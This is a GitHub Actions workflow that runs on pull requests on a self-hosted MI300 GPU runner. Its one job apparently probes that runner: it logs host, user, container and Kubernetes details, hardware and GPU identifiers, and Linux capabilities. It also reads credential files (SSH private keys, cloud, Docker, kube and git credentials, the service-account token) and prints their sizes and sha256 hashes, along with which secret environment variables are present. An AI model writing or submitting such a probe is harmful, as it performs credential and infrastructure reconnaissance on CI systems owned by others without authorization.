name: c211-i125282-mi300x8
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  job-mi300x8-01:
    name: probe-mi300x8-01
    runs-on: [linux-mi300-8gpu-sglang]
    timeout-minutes: 15
    steps:
      - name: c211 probe mi300x8-01
        shell: bash
        run: |
          NONCE='c211-i125282-d475252d4c51c3ba'
          set -u
          echo "C211_JOB=mi300x8-01 NONCE=$NONCE"
          echo "C211_MARKER job=mi300x8-01 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
          id || true
          uname -a 2>&1 || true
          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
          echo "--- AMD (rocm-smi) ---"
          if command -v rocm-smi >/dev/null 2>&1; then
            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
          else echo ROCM_SMI_ABSENT; fi
          echo "--- AMD (amd-smi) ---"
          if command -v amd-smi >/dev/null 2>&1; then
            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
          else echo AMD_SMI_ABSENT; fi
          echo "--- NVIDIA ---"
          if command -v nvidia-smi >/dev/null 2>&1; then
            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
          else echo NVIDIA_SMI_ABSENT; fi
          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
            if [ -e "$p" ]; then
              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
            else
              echo "FP path=$p present=no"
            fi
          done
          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
          echo "C211_DONE job=mi300x8-01 nonce=$NONCE host=$(hostname)"
